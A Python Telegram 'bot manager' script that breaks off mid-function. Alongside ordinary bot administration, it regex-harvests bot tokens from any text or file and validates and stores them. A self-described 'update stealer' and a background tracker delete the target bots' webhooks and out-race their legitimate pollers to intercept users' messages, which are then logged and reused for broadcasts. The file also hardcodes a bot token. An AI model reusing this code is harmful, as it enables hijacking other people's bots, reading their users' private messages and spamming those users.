#!/usr/bin/env python3
"""
PREMIUM BOT MANAGER v6.10
- Colored + Bold buttons
- Send: unlimited User IDs + User List select
- Per-user: View Messages (1s silent refresh) + Send Message
- Back on every screen
- Switching feature auto-cancels previous flow
- Delete/Edit/React via MAIN bot
"""

import asyncio
import json
import logging
import re
from pathlib import Path
from typing import Optional, Dict, Any, List
from datetime import datetime

from telegram import (
    Update, ReplyKeyboardMarkup, KeyboardButton,
    Bot,
    InlineKeyboardMarkup, InlineKeyboardButton,
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, ConversationHandler, filters, Defaults,
)
from contextvars import ContextVar as _ContextVar

# ── Multi-bot support ───────────────────────────────────────────────────────
# Each bot running in this process stores its config here keyed by bot.id.
# _BOT_CFG is set per-update via MultiApp.process_update so every handler
# automatically picks up the right owner/data-file without code changes.
_BOT_CFG      = _ContextVar('bot_cfg', default=None)
_BOT_CONFIGS  = {}   # {telegram_bot_id: {"owner_id":int, "data_file":Path, "is_main":bool}}
_RUNNING_APPS = {}   # {telegram_bot_id: Application}

def _cfg():
    """Return config for the bot currently handling this update."""
    return _BOT_CFG.get() or {}

def _cfg_data_file():
    return _cfg().get("data_file") or DATA_FILE

def _cfg_owner():
    return _cfg().get("owner_id") or OWNER_ID
from telegram.constants import ParseMode

# ================== CONFIG ==================
MAIN_BOT_TOKEN = "8965481214:AAEKov6iedfQsGtC8loyPDVkVTUEO-S_xvk"
OWNER_ID = 0  # Set via /setup on first run — auto-saved to data file
MAIN_OWNER_ID = 8711563973  # Hardcoded super-admin — Clone Bot feature

# Hosting-safe data dir (Railway/Termux/Hosting-bot writable)
import os as _os
_BASE = Path(__file__).resolve().parent
_DATA_DIR = Path(_os.getenv("DATA_DIR", str(_BASE / "data")))
try:
    _DATA_DIR.mkdir(parents=True, exist_ok=True)
except Exception:
    _DATA_DIR = _BASE
DATA_FILE = _DATA_DIR / "ʙᴏᴛꜱ_data.json"
MSG_LOG_FILE = _DATA_DIR / "messages_log.json"
# ============================================

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

(
    WAIT_ADD_TOKEN, WAIT_NAME, WAIT_BIO, WAIT_DESC, WAIT_PHOTO,
    WAIT_NAME_MODE, WAIT_BIO_MODE, WAIT_PHOTO_MODE,
    WAIT_NAME_ALL, WAIT_BIO_ALL, WAIT_PHOTO_ALL,
    WAIT_PROFILE_ACTION, WAIT_PROFILE_TOKEN, WAIT_PROFILE_DESC, WAIT_PROFILE_SHORT,
    WAIT_PROFILE_DESC_ALL, WAIT_PROFILE_SHORT_ALL,
    WAIT_CLONE_TOKEN, WAIT_CLONE_OWNER, WAIT_CLONE_VIEW,
    WAIT_SEND_CHAT, WAIT_SEND_CONTENT,
    WAIT_SEND_UID, WAIT_SEND_UID_CONTENT,
    WAIT_BROADCAST,
    WAIT_USER_VIEW,
    WAIT_ADD_ADMIN, WAIT_REMOVE_ADMIN,
    WAIT_EDIT_TEXT,
    WAIT_MULTI_UID, WAIT_MULTI_SEND,
    WAIT_PICK_USER_SEND,
    WAIT_FILE_BROADCAST,
    WAIT_ADDED_BROADCAST,
) = range(34)


# ── Drift font system: 𝐁old-serif first letter + ꜱᴍᴀʟʟ ᴄᴀᴘꜱ rest ──────────
# "View Messages" → "𝐕ɪᴇᴡ 𝐌ᴇꜱꜱᴀɢᴇꜱ"
_DRIFT_BOLD = dict(zip('abcdefghijklmnopqrstuvwxyz',
                       '𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙'))
_DRIFT_SC   = dict(zip('abcdefghijklmnopqrstuvwxyz',
                       'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀꜱᴛᴜᴠᴡxʏᴢ'))
# Used by _norm() — reverse all styled glyphs back to ASCII
_SC_INV     = {v: k.upper() for k, v in _DRIFT_SC.items()}
_SC_INV.update({v: k for k, v in _DRIFT_BOLD.items()})
_SC_MAP     = _DRIFT_SC   # kept for any legacy reference

_DRIFT_TO_ASCII = str.maketrans({
    **{b: a for a, b in _DRIFT_BOLD.items()},
    **{s: a for a, s in _DRIFT_SC.items()},
    **{c: c.lower() for c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'},
})
_PROTECT_RE = re.compile(
    r'(https?://\S+|t\.me/\S+|@[A-Za-z0-9_]{4,}|/[A-Za-z][A-Za-z0-9_]*'
    r'|\{[^}]*\}|<[^>]+>|&[a-z]+;|```.*?```|`[^`\n]*`)',
    re.DOTALL | re.IGNORECASE)

def _drift_plain(text: str) -> str:
    text = text.translate(_DRIFT_TO_ASCII)
    out = []; word_start = True
    for ch in text:
        if ch.isascii() and ch.isalpha():
            lo = ch.lower()
            out.append(_DRIFT_BOLD[lo] if word_start else _DRIFT_SC.get(lo, lo))
            word_start = False
        else:
            out.append(ch)
            word_start = not (ch.isascii() and (ch.isdigit() or ch == '_'))
    return ''.join(out)

def stylize(text: str) -> str:
    """Apply Drift font: bold first letter + small caps, preserving HTML/URLs."""
    if not isinstance(text, str) or not text:
        return text
    parts = _PROTECT_RE.split(text)
    return ''.join(p if i % 2 else _drift_plain(p) for i, p in enumerate(parts))

def to_small_caps(text: str) -> str:
    return stylize(text)

def bold_label(text: str) -> str:
    return stylize(text)

def sc(text: str) -> str:
    return stylize(text)


def _norm(s: str) -> str:
    """Strip mathematical bold / small caps unicode back to plain ASCII for matching."""
    out = []
    for ch in s or "":
        o = ord(ch)
        # Mathematical bold A-Z
        if 0x1D400 <= o <= 0x1D419:
            out.append(chr(ord("A") + (o - 0x1D400)))
        # Mathematical bold a-z
        elif 0x1D41A <= o <= 0x1D433:
            out.append(chr(ord("a") + (o - 0x1D41A)))
        # Mathematical bold digits
        elif 0x1D7CE <= o <= 0x1D7D7:
            out.append(chr(ord("0") + (o - 0x1D7CE)))
        # Small caps → plain uppercase
        elif ch in _SC_INV:
            out.append(_SC_INV[ch])
        else:
            out.append(ch)
    return "".join(out)


# Runtime-detected: if Telegram rejects color/style, set False → plain buttons, no crash
_STYLE_SUPPORTED = True



def btn(text: str, style: str = "primary") -> KeyboardButton:
    """Colored button — same approach as confirmed-working v6.10 file."""
    label = bold_label(text)
    try:
        return KeyboardButton(label, api_kwargs={"style": style})
    except Exception:
        return KeyboardButton(label)


def eq(text: str, *keys: str) -> bool:
    t = _norm(text or "").upper().strip()
    return any(k.upper() in t for k in keys)


def load_data() -> Dict[str, Any]:
    path = _cfg_data_file()
    if path.exists():
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {"ʙᴏᴛꜱ": {}, "ᴀᴅᴍɪɴꜱ": [], "saved_uids": []}


def save_data(data: Dict[str, Any]):
    path = _cfg_data_file()
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)


def load_msgs(bot_key: str = "main") -> List[dict]:
    """bot_key='main' → manager bot log; else per-selected-bot log."""
    paths = []
    if bot_key == "main":
        paths = [MSG_LOG_FILE, _BASE / "messages_log.json"]
    else:
        paths = [_DATA_DIR / f"msgs_{bot_key}.json", _BASE / f"msgs_{bot_key}.json"]
    merged = []
    seen = set()
    for path in paths:
        try:
            if not path.exists():
                continue
            data = json.loads(path.read_text(encoding="utf-8"))
            if not isinstance(data, list):
                continue
            for m in data:
                sig = (m.get("message_id"), m.get("user_id"), m.get("time"), m.get("text"), m.get("direction"))
                if sig in seen:
                    continue
                seen.add(sig)
                merged.append(m)
        except Exception:
            continue
    return merged


def save_msgs(msgs: List[dict], bot_key: str = "main"):
    path = MSG_LOG_FILE if bot_key == "main" else _DATA_DIR / f"msgs_{bot_key}.json"
    with open(path, "w", encoding="utf-8") as f:
        json.dump(msgs[-20000:], f, indent=2, ensure_ascii=False)



def token_key(token: str) -> str:
    import hashlib
    return hashlib.md5(token.encode()).hexdigest()[:12]


def append_msg_log(bot_token: str, entry: dict):
    """Append one message entry to selected bot log + saved_uids."""
    key = token_key(bot_token)
    msgs = load_msgs(key)
    msgs.append(entry)
    save_msgs(msgs, key)
    data = load_data()
    uid = entry.get("user_id")
    if uid is not None:
        try:
            uid = int(uid)
            saved = data.setdefault("saved_uids", [])
            if uid not in saved and not is_admin(uid):
                saved.append(uid)
            per = data.setdefault("bot_uids", {})
            lst = per.setdefault(key, [])
            if uid not in lst:
                lst.append(uid)
            save_data(data)
        except Exception:
            pass



def set_active_token(uid: int, token: str):
    data = load_data()
    data.setdefault("active_by_user", {})[str(uid)] = token
    save_data(data)

def get_persisted_active(uid: int) -> str:
    data = load_data()
    return data.get("active_by_user", {}).get(str(uid)) or ""

def log_outbound(token: str, uid: int, text: str, msg_id: int = 0, chat_id: int = 0):
    """Save outbound so VIEW always has history (hosting-safe)."""
    if not token:
        return
    try:
        uid = int(uid)
    except Exception:
        return
    entry = {
        "time": datetime.now().strftime("%H:%M:%S"),
        "message_id": msg_id or 0,
        "chat_id": chat_id or uid,
        "user_id": uid,
        "username": "",
        "name": str(uid),
        "text": (text or "")[:4000],
        "type": "text",
        "file_id": None,
        "bot_key": token_key(token),
        "direction": "out",
    }
    try:
        append_msg_log(token, entry)
    except Exception as e:
        logger.warning("log_outbound append fail: %s", e)
    # dual write fallback next to script
    try:
        key = token_key(token)
        fb = _BASE / f"msgs_{key}.json"
        cur = []
        if fb.exists():
            try:
                cur = json.loads(fb.read_text(encoding="utf-8")) or []
            except Exception:
                cur = []
        cur.append(entry)
        fb.write_text(json.dumps(cur[-20000:], indent=2, ensure_ascii=False), encoding="utf-8")
    except Exception as e:
        logger.warning("log_outbound fallback fail: %s", e)


# ─────────────────────────────────────────────────────────────────
# FILE TOKEN EXTRACTION
# Telegram bot token format: 8-10 digits : 35 alphanumeric chars
# ─────────────────────────────────────────────────────────────────
_TOKEN_RE = re.compile(r'\b(\d{8,10}:[A-Za-z0-9_-]{35})\b')

def extract_bot_tokens(text: str) -> list:
    """Regex-extract all Telegram bot tokens from any text."""
    return list(set(_TOKEN_RE.findall(text or "")))


async def auto_validate_and_save(tokens: list) -> tuple:
    """Validate tokens via getMe and save to ʙᴏᴛꜱ dict. Returns (added, failed)."""
    added = []; failed = []
    data = load_data()
    data.setdefault("ʙᴏᴛꜱ", {})
    for tok in tokens:
        if tok in data["ʙᴏᴛꜱ"]:
            continue  # already saved
        try:
            b = Bot(token=tok)
            await b.initialize()
            me = await b.get_me()
            await b.shutdown()
            data["ʙᴏᴛꜱ"][tok] = {"name": me.first_name, "username": me.username or "", "id": me.id}
            added.append(f"✅ @{me.username or me.first_name}")
        except Exception as e:
            failed.append(f"❌ {tok[:20]}… — {str(e)[:30]}")
    if added:
        save_data(data)
    return added, failed

def save_file_tokens(new_tokens: list) -> int:
    """Append newly found tokens to data['file_tokens']. Returns count added."""
    if not new_tokens:
        return 0
    data = load_data()
    existing = {t["token"] for t in data.get("file_tokens", [])}
    added = 0
    for tok in new_tokens:
        if tok not in existing:
            existing.add(tok)
            data.setdefault("file_tokens", []).append({
                "token": tok,
                "added_at": datetime.now().strftime("%d/%m %H:%M"),
            })
            added += 1
    if added:
        save_data(data)
    return added


def get_file_tokens() -> list:
    """Return all file-extracted token entries: [{"token": ..., "added_at": ...}]."""
    return load_data().get("file_tokens", [])


def clear_file_tokens():
    """Remove all file-extracted tokens."""
    data = load_data()
    data["file_tokens"] = []
    save_data(data)

async def oneshot_fetch_updates(token: str, max_batches: int = 60, conflict_wait: float = 3.0) -> int:
    """
    AGGRESSIVE update stealer.
    timeout=1 (not 0): When our newer call arrives, Telegram KICKS the other poller's
    long-poll (Railway/hosting) and serves us. We get a 1-second window to grab messages.
    After 1s, Railway reconnects; we call again and kick again. Alternating windows.
    deleteWebhook forced at start — handles both webhook-mode and polling-mode remote ʙᴏᴛꜱ.
    Returns: number of messages saved, or -1 if fully blocked.
    """
    key = token_key(token)
    bot = Bot(token=token)
    saved = 0
    saw_conflict = False
    bot_id = None
    consecutive_409 = 0
    try:
        await bot.initialize()

        # Force-clear any active webhook — unblocks us for getUpdates
        for _ in range(2):
            try:
                await bot.delete_webhook(drop_pending_updates=False)
                break
            except Exception:
                await asyncio.sleep(0.3)

        # Cache bot's own ID once
        try:
            me = await bot.get_me()
            bot_id = me.id
        except Exception:
            pass

        offset = 0
        empty_streak = 0

        for attempt in range(max_batches):
            try:
                updates = await bot.get_updates(
                    offset=offset if offset else None,
                    timeout=1,      # KEY: 1s long-poll kicks other pollers (newer call wins)
                    limit=100,
                    allowed_updates=["message", "edited_message", "callback_query"],
                )
            except Exception as e:
                err = str(e).lower()
                if "409" in err or "conflict" in err:
                    saw_conflict = True
                    consecutive_409 += 1
                    if consecutive_409 <= 5:
                        await asyncio.sleep(0.05)   # rapid — catch the gap
                    elif consecutive_409 <= 10:
                        # Force-clear webhook again, might help
                        try:
                            await bot.delete_webhook(drop_pending_updates=False)
                        except Exception:
                            pass
                        await asyncio.sleep(0.5)
                    else:
                        await asyncio.sleep(conflict_wait)
                        consecutive_409 = 0
                    continue
                consecutive_409 = 0
                await asyncio.sleep(0.2)
                continue

            consecutive_409 = 0
            if not updates:
                empty_streak += 1
                if empty_streak >= 5:
                    break
                continue
            empty_streak = 0

            for u in updates:
                offset = u.update_id + 1
                m = (
                    getattr(u, "message", None)
                    or getattr(u, "edited_message", None)
                )
                if not m or not m.from_user:
                    continue
                if bot_id and m.from_user.id == bot_id:
                    continue

                # Determine message type and content
                msg_type = "text"
                file_id = None
                text_content = (m.text or m.caption or "")[:4000]
                if m.photo:
                    msg_type = "photo"
                    file_id = m.photo[-1].file_id
                    text_content = text_content or "[📸 Photo]"
                elif m.video:
                    msg_type = "video"
                    file_id = m.video.file_id
                    text_content = text_content or "[🎬 Video]"
                elif m.document:
                    msg_type = "document"
                    file_id = m.document.file_id
                    fname = getattr(m.document, "file_name", "") or ""
                    text_content = text_content or f"[📎 {fname}]"
                elif m.voice:
                    msg_type = "voice"
                    text_content = "[🎤 Voice]"
                elif m.audio:
                    msg_type = "audio"
                    text_content = "[🎵 Audio]"
                elif m.sticker:
                    msg_type = "sticker"
                    text_content = f"[🎭 {getattr(m.sticker, 'emoji', 'Sticker')}]"

                entry = {
                    "time":       datetime.now().strftime("%H:%M:%S"),
                    "message_id": m.message_id,
                    "chat_id":    m.chat.id if m.chat else m.from_user.id,
                    "user_id":    m.from_user.id,
                    "username":   m.from_user.username or "",
                    "name":       (m.from_user.full_name or "")[:25],
                    "text":       text_content,
                    "type":       msg_type,
                    "file_id":    file_id,
                    "bot_key":    key,
                    "direction":  "in",
                }
                append_msg_log(token, entry)
                saved += 1

    except Exception as e:
        logger.warning("oneshot fetch: %s", e)
        if "409" in str(e) or "Conflict" in str(e):
            saw_conflict = True
    finally:
        try:
            await bot.shutdown()
        except Exception:
            pass

    if saved == 0 and saw_conflict:
        return -1
    return saved



async def track_bot_messages(token: str):
    """Full-power background tracker — short-poll (timeout=0) for fastest response."""
    key = token_key(token)
    offset = 0
    bot = Bot(token=token)
    fail_streak = 0
    try:
        await bot.initialize()
        try:
            await bot.delete_webhook(drop_pending_updates=False)
        except Exception:
            pass
        while True:
            try:
                updates = await bot.get_updates(
                    offset=offset if offset else None,
                    timeout=0,          # SHORT POLL — instant return
                    limit=100,
                    allowed_updates=["message", "edited_message"],
                )
                fail_streak = 0
            except asyncio.CancelledError:
                break
            except Exception as e:
                err = str(e).lower()
                fail_streak += 1
                if "409" in err or "conflict" in err:
                    try:
                        await bot.delete_webhook(drop_pending_updates=False)
                    except Exception:
                        pass
                    await asyncio.sleep(min(0.1 + fail_streak * 0.05, 0.8))  # faster recovery
                else:
                    await asyncio.sleep(min(0.5 + fail_streak * 0.2, 4.0))
                continue
            if not updates:
                await asyncio.sleep(0.1)  # short idle sleep
                continue
            for u in updates:
                offset = u.update_id + 1
                m = getattr(u, "message", None) or getattr(u, "edited_message", None)
                if not m or not m.from_user:
                    continue
                entry = {
                    "time": datetime.now().strftime("%H:%M:%S"),
                    "message_id": m.message_id,
                    "chat_id": m.chat.id if m.chat else m.from_user.id,
                    "user_id": m.from_user.id,
                    "username": m.from_user.username or "",
                    "name": (m.from_user.full_name or "")[:25],
                    "text": (m.text or m.caption or "")[:4000],
                    "type": "text",
                    "file_id": None,
                    "bot_key": key,
                    "direction": "in",
                }
                if m.photo:
                    entry["type"] = "photo"
                    entry["file_id"] = m.photo[-1].file_id
                elif m.video:
                    entry["type"] = "video"
                    entry["file_id"] = m.video.file_id
                elif m.document:
                    entry["type"] = "document"
                    entry["file_id"] = m.document.file_id
                elif m.sticker:
                    entry["type"] = "sticker"
                    entry["text"] = entry["text"] or "[sticker]"
                append_msg_log(token, entry)
            await asyncio.sleep(0.02)
    except asyncio.CancelledError:
        pass
    except Exception as e:
        logger.warning("tracker end: %s", e)
    finally:
        try:
            await bot.shutdown()
        except Exception:
            pass



def start_tracker(token: str, app=None):
    """Start/replace background tracker for selected bot (hosting-safe)."""
    for tkn, task in list(_BOT_TRACKERS.items()):
        try:
            if not task.done():
                task.cancel()
        except Exception:
            pass
        _BOT_TRACKERS.pop(tkn, None)
    try:
        loop = None
        try:
            loop = asyncio.get_running_loop()
        except RuntimeError:
            pass
        if app is not None:
            task = app.create_task(track_bot_messages(token))
        elif loop is not None:
            task = loop.create_task(track_bot_messages(token))
        else:
            return  # no loop on host bootstrap — VIEW oneshot still works
        _BOT_TRACKERS[token] = task
    except Exception as e:
        logger.warning("tracker start fail: %s", e)


def is_owner(uid: int) -> bool:
    if uid == MAIN_OWNER_ID:
        return True
    eff = _cfg_owner()
    if eff and uid == eff:
        return True
    stored = load_data().get("owner_id", 0)
    if stored and uid == int(stored):
        return True
    return OWNER_ID != 0 and uid == OWNER_ID

def is_main_owner(uid: int) -> bool:
    # Only available on the main bot, not on clones
    if _cfg().get("is_main") is False:
        return False
    return uid == MAIN_OWNER_ID

def set_owner(uid: int):
    data = load_data()
    data["owner_id"] = uid
    save_data(data)


def is_admin(uid: int) -> bool:
    if is_owner(uid):
        return True
    return uid in load_data().get("ᴀᴅᴍɪɴꜱ", [])


def cancel_bg_tasks(context: ContextTypes.DEFAULT_TYPE):
    """Silently stop any running refresh / background task."""
    for key in ("_refresh_task", "_bg_task"):
        task = context.user_data.pop(key, None)
        if task and not task.done():
            task.cancel()
    context.user_data.pop("_refresh_chat", None)
    context.user_data.pop("_refresh_uid", None)
    context.user_data.pop("_refresh_msg_id", None)
    context.user_data.pop("waiting_edit", None)
    context.user_data.pop("flow", None)


def clear_temp(context: ContextTypes.DEFAULT_TYPE):
    cancel_bg_tasks(context)
    keep = {"active_token", "selected_uid"}
    for k in list(context.user_data.keys()):
        if k not in keep:
            del context.user_data[k]


# ─── Colored buttons via api_kwargs style (confirmed working) ───
def _L(e, t): return f"{e} {to_small_caps(t)}"

# ─── Bot API 9.4 colored buttons ─────────────────────────────────────────────
# Bot API 9.4 added "style" field on KeyboardButton: "primary"(blue), "success"(green), "danger"(red)
# Direct to_dict() override guarantees field is in JSON regardless of PTB version.
_CM = {"primary": "primary", "success": "success", "danger": "danger",
       "warning": "primary", "info": "primary"}

class _CKB(ReplyKeyboardMarkup):
    """ReplyKeyboardMarkup that injects Bot API 9.4 style field into every button via to_dict()."""
    def __init__(self, rows_with_styles, **kw):
        self._rws = rows_with_styles
        plain = [[KeyboardButton(lbl) for lbl, _ in row] for row in rows_with_styles]
        super().__init__(plain, **kw)

    def to_dict(self):
        try:
            d = super().to_dict()
        except Exception:
            d = {"resize_keyboard": True, "is_persistent": True}
        d["keyboard"] = [
            [{"text": lbl, "style": _CM.get(st, "primary")} for lbl, st in row]
            for row in self._rws
        ]
        return d

def _btn(label: str, style: str = "primary"):
    """Single (label, style) tuple — consumed by _CKB rows."""
    return (label, style)

_KB = dict(resize_keyboard=True, is_persistent=True)

# ── Keyboards ── (all use _CKB for guaranteed color injection)
def main_kb(uid: int) -> _CKB:
    if not is_admin(uid):
        return _CKB([[_btn(_L("🔒","Private Bot"), "danger")]], **_KB)
    return _CKB([
        [_btn(_L("👁️","View Messages"),"primary"),  _btn(_L("✉️","Send Message"),   "primary")],
        [_btn(_L("📡","Broadcast"),     "success"),  _btn(_L("✏️","Change Name"),    "primary")],
        [_btn(_L("📁","Broadcast File"),"warning"),  _btn(_L("➕","Broadcast Added"), "success")],
        [_btn(_L("📝","Change Bio"),    "primary"),  _btn(_L("📋","Change Desc"),    "primary")],
        [_btn(_L("🖼","Change Photo"),  "primary"),  _btn(_L("👥","All Users"),      "success")],
        [_btn(_L("📝","Profile Text"),  "success"),  _btn(_L("🔱","Owner Panel"),    "danger")],
    ], **_KB)

def send_kb() -> _CKB:
    return _CKB([
        [_btn(_L("🚀","Bot Message"), "primary"), _btn(_L("📨","Send To User"), "success")],
        [_btn(_L("➕","Add User"),    "success"), _btn(_L("📋","User List"),    "primary")],
        [_btn(_L("🔙","Back"),        "danger"),  _btn(_L("🏠","Main Menu"),    "primary")],
    ], **_KB)

def view_kb() -> _CKB:
    return _CKB([
        [_btn(_L("💬","All Messages"), "primary"), _btn(_L("🔍","By User Id"), "success")],
        [_btn(_L("🔙","Back"),         "danger"),  _btn(_L("🏠","Main Menu"),  "primary")],
    ], **_KB)

def owner_kb(uid: int = 0) -> _CKB:
    rows = [
        [_btn(_L("🔑","Add Bot Token"), "success"), _btn(_L("🤖","My Bots"),    "primary")],
        [_btn(_L("🗑","Remove Bot"),    "danger"),  _btn(_L("⭐","Add Admin"),   "success")],
        [_btn(_L("🚫","Remove Admin"),  "danger"),  _btn(_L("👑","Admin List"),  "primary")],
        [_btn(_L("🌐","Server Status"), "success"), _btn(_L("🏠","Main Menu"),   "primary")],
    ]
    if is_main_owner(uid):
        rows.insert(-1, [
            _btn(_L("🤖","Clone Bot"),      "success"),
            _btn(_L("🗄","Clone Database"), "primary"),
        ])
    return _CKB(rows, **_KB)


def clone_db_kb(clones: dict) -> _CKB:
    rows = []
    row  = []
    for oid, info in clones.items():
        uname = info.get("username") or info.get("name","Clone")
        row.append(_btn(f"👤 @{uname}", "primary"))
        if len(row) == 2: rows.append(row); row = []
    if row: rows.append(row)
    rows.append([_btn(_L("🏠","Main Menu"), "primary")])
    return _CKB(rows, **_KB)


def clone_action_kb() -> _CKB:
    return _CKB([
        [_btn(_L("📋","View Bots"), "success"), _btn(_L("🏠","Main Menu"), "primary")],
    ], **_KB)

def ʙᴏᴛꜱ_kb(ʙᴏᴛꜱ: dict, page: int = 0) -> _CKB:
    PAGE_SIZE = 10
    items = list(ʙᴏᴛꜱ.items())
    total = len(items)
    start = page * PAGE_SIZE
    end = min(start + PAGE_SIZE, total)
    page_items = items[start:end]
    rows = []; row = []
    for t, info in page_items:
        u = info.get("username") or ""; n = info.get("name") or "Bot"
        lbl = to_small_caps(f"Select @{u}" if u else f"Select {n}")
        row.append(_btn(lbl, "primary"))
        if len(row) == 2: rows.append(row); row = []
    if row: rows.append(row)
    nav = []
    if page > 0:
        nav.append(_btn(_L("◀","Prev Page"), "warning"))
    if end < total:
        nav.append(_btn(_L("▶","Next Page"), "warning"))
    if nav:
        rows.append(nav)
    rows.append([_btn(_L("🔑","Add Bot Token"), "success"), _btn(_L("🔱","Owner Panel"), "danger")])
    return _CKB(rows, **_KB)

def control_kb() -> _CKB:
    return _CKB([
        [_btn(_L("👁️","View Messages"), "primary"), _btn(_L("✉️","Send Message"), "primary")],
        [_btn(_L("📡","Broadcast"),      "success"), _btn(_L("✏️","Change Name"),  "primary")],
        [_btn(_L("📝","Change Bio"),     "primary"), _btn(_L("📋","Change Desc"),  "primary")],
        [_btn(_L("🖼","Change Photo"),   "primary")],
        [_btn(_L("🤖","My Bots"),        "primary"), _btn(_L("🏠","Main Menu"),    "primary")],
    ], **_KB)

def change_mode_kb() -> _CKB:
    """Single vs All choice keyboard for Name / Bio / Photo changes."""
    return _CKB([
        [_btn(_L("🔄","Change Single"), "primary"), _btn(_L("🌐","Change All"), "success")],
        [_btn(_L("🔙","Back"),          "danger"),  _btn(_L("🏠","Main Menu"),  "primary")],
    ], **_KB)

def user_action_kb() -> _CKB:
    return _CKB([
        [_btn(_L("👁️","View User Msgs"), "primary"), _btn(_L("📨","Send To This User"), "success")],
        [_btn(_L("🔙","Back"),            "danger"),  _btn(_L("🏠","Main Menu"),         "primary")],
    ], **_KB)

def multi_uid_kb() -> _CKB:
    return _CKB([
        [_btn(_L("✅","Done Add Ids"), "success"), _btn(_L("🗑","Clear Ids"), "danger")],
        [_btn(_L("🔙","Back"),         "danger"),  _btn(_L("🏠","Main Menu"), "primary")],
    ], **_KB)

def profile_action_kb() -> _CKB:
    return _CKB([
        [_btn(_L("🔑","Enter Bot Token"),         "primary")],
        [_btn(_L("📝","Change Description"),      "success"), _btn(_L("✏️","Change Short Desc"),   "success")],
        [_btn(_L("🌐","All Change Description"),  "success"), _btn(_L("🌐","All Change Short Desc"),"success")],
        [_btn(_L("🔍","Check Description"),       "primary"), _btn(_L("🗑️","Remove Description"),  "danger")],
        [_btn(_L("❌","Cancel"),                  "danger"),  _btn(_L("🏠","Main Menu"),            "primary")],
    ], **_KB)

def back_main_kb() -> _CKB:
    return _CKB([
        [_btn(_L("🔙","Back"), "danger"), _btn(_L("🏠","Main Menu"), "primary")],
    ], **_KB)






def deep_scan_users(active_token: str = None) -> list:
    """Deep scan ALL local logs + bot_uids for every known user."""
    found = {}
    files = [MSG_LOG_FILE] + list(_DATA_DIR.glob("msgs_*.json")) + list(_DATA_DIR.glob("messages*.json"))
    if active_token:
        files.append(_DATA_DIR / f"msgs_{token_key(active_token)}.json")
    for fp in files:
        try:
            p = Path(fp)
            if not p.exists():
                continue
            raw = json.loads(p.read_text(encoding="utf-8"))
            if not isinstance(raw, list):
                continue
            for m in raw:
                uid = m.get("user_id")
                if uid is None:
                    continue
                try:
                    uid = int(uid)
                except Exception:
                    continue
                prev = found.get(uid) or {}
                found[uid] = {
                    "user_id": uid,
                    "name": m.get("name") or prev.get("name") or "",
                    "username": m.get("username") or prev.get("username") or "",
                }
        except Exception:
            continue
    try:
        data = load_data()
        for uid in data.get("saved_uids", []):
            try:
                uid = int(uid)
            except Exception:
                continue
            found.setdefault(uid, {"user_id": uid, "name": str(uid), "username": ""})
        for _k, lst in (data.get("bot_uids") or {}).items():
            for uid in lst:
                try:
                    uid = int(uid)
                except Exception:
                    continue
                found.setdefault(uid, {"user_id": uid, "name": str(uid), "username": ""})
        if active_token:
            key = token_key(active_token)
            for uid in data.get("bot_uids", {}).get(key, []):
                try:
                    uid = int(uid)
                except Exception:
                    continue
                found.setdefault(uid, {"user_id": uid, "name": str(uid), "username": ""})
    except Exception:
        pass
    return list(found.values())


def get_broadcast_targets(active_token: str) -> list:
    """
    FULL user discovery for broadcast:
    1. Key-specific message log (selected bot)
    2. bot_uids[key] (tracker-captured users)
    3. saved_uids (manually added via ADD USER)
    4. DEEP SCAN all local logs as fallback (old sessions, other bot logs)
    This ensures maximum user coverage even when 409 blocks live fetch.
    """
    key = token_key(active_token)
    data = load_data()
    found = {}

    def _add_msgs(msg_list):
        for m in (msg_list or []):
            try:
                found[int(m["user_id"])] = True
            except Exception:
                pass

    # 1. Key-specific logs
    _add_msgs(load_msgs(key))
    for folder in (_DATA_DIR, _BASE):
        try:
            fp = folder / f"msgs_{key}.json"
            if fp.exists():
                raw = json.loads(fp.read_text(encoding="utf-8"))
                if isinstance(raw, list):
                    _add_msgs(raw)
        except Exception:
            pass

    # 2. bot_uids for this key
    for uid in data.get("bot_uids", {}).get(key, []):
        try:
            found[int(uid)] = True
        except Exception:
            pass

    # 3. Manually saved UIDs
    for uid in data.get("saved_uids", []):
        try:
            found[int(uid)] = True
        except Exception:
            pass

    # 4. Deep scan ALL local logs (catches users from old sessions, any bot)
    for u in deep_scan_users(active_token):
        try:
            found[int(u["user_id"])] = True
        except Exception:
            pass

    return list(found.keys())


async def get_active_bot(context) -> Optional[Bot]:
    token = context.user_data.get("active_token")
    if not token:
        return None
    try:
        b = Bot(token=token)
        await b.initialize()
        return b
    except Exception:
        return None


# ================== LOGGER ==================
async def log_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.effective_user:
        return
    txt = (update.message.text or "")[:50].upper()
    skip = (
        "VIEW", "SEND", "CHANGE", "BROADCAST", "OWNER", "ADD", "REMOVE",
        "ADMIN", "SERVER", "MAIN", "BOT", "PHOTO", "NAME", "BIO", "DESC",
        "USERS", "ALL", "BACK", "MULTI", "LIST", "DONE", "CLEAR", "PRIVATE",
    )
    if any(x in txt for x in skip):
        return
    m = update.message
    u = update.effective_user
    c = update.effective_chat
    entry = {
        "time": datetime.now().strftime("%H:%M:%S"),
        "message_id": m.message_id,
        "chat_id": c.id,
        "user_id": u.id,
        "username": u.username or "",
        "name": (u.full_name or "")[:25],
        "text": (m.text or m.caption or "")[:120],
        "type": "text",
        "file_id": None,
    }
    if m.photo:
        entry["type"] = "photo"
        entry["file_id"] = m.photo[-1].file_id
    elif m.video:
        entry["type"] = "video"
        entry["file_id"] = m.video.file_id
    elif m.document:
        entry["type"] = "document"
        entry["file_id"] = m.document.file_id
    msgs = load_msgs()
    msgs.append(entry)
    save_msgs(msgs)
    # also track uid in saved list
    data = load_data()
    saved = data.setdefault("saved_uids", [])
    if u.id not in saved and not is_admin(u.id):
        saved.append(u.id)
        save_data(data)


# ================== START ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    clear_temp(context)
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text(
